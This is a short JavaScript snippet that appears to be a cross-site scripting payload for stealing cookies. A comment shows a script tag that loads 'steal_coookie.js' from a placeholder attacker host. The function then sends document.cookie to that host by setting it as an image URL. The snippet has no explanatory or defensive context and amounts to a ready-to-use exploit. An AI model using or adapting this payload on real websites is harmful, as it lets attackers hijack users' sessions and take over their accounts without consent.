//Script execution: <script src='http://attacker-ip:attacker_port/steal_coookie.js'></script>

function addTheImage() {
var img = document.createElement('img');
img.src = 'http://attacker-ip:attacker-port/' + document.cookie;
document.body.appendChild(img);
}
addTheImage();
